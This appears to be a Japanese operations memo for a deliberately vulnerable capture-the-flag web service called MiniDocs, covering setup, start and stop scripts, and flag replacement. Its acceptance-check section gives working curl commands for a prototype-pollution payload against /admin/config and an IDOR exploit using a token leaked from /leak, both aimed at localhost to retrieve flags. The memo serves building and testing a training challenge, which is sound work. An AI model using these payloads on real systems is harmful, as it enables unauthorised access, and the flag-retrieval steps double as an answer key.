[MiniDocs 運用メモ]

■ 前提
- /opt/web-pack/minidocs に server.js / start_all.sh / stop_all.sh を配置
- システムユーザ ctfsvc が存在（無ければ: sudo useradd -r -s /usr/sbin/nologin ctfsvc）
- Node.js が導入済（Kali標準の node でOK）

■ 起動
sudo /opt/web-pack/minidocs/start_all.sh

（起動と同時に /tmp/web-pack/FLAG_PP.txt / FLAG_IDOR.txt を生成）

■ 停止
sudo /opt/web-pack/minidocs/stop_all.sh

■ 稼働確認
ss -ltnp | grep 127.0.0.1:8000 || true
sudo tail -n +1 /tmp/web-pack/minidocs.log

■ 検収（例）
# PP: revealSecret を有効化 → /admin/info でフラグ
curl -s -X POST -d 'json={"__proto__":{"revealSecret":true}}' http://127.0.0.1:8000/admin/config >/dev/null
curl -s http://127.0.0.1:8000/admin/info | grep -o 'PCTF{[^}]*}'

# IDOR: /leak の末尾4桁 → victim=vi のdocにアクセス
t4=$(curl -s http://127.0.0.1:8000/leak | sed -n 's/.*doc-\*\*-\([0-9a-f]\{4\}\).*/\1/p')
curl -s "http://127.0.0.1:8000/docs/doc-vi-$t4" | grep -o 'PCTF{[^}]*}'

■ フラグ差し替え（起動時上書き）
sudo FLAG_PP='PCTF{pp_2025_xxx}' FLAG_IDOR='PCTF{idor_2025_xxx}' /opt/web-pack/minidocs/start_all.sh

■ 既知仕様
- IDORのFLAG本文は「起動時のファイル内容」を本文に埋め込みます（再起動で更新）。
- start/stopは冪等。2回叩いても壊れません。
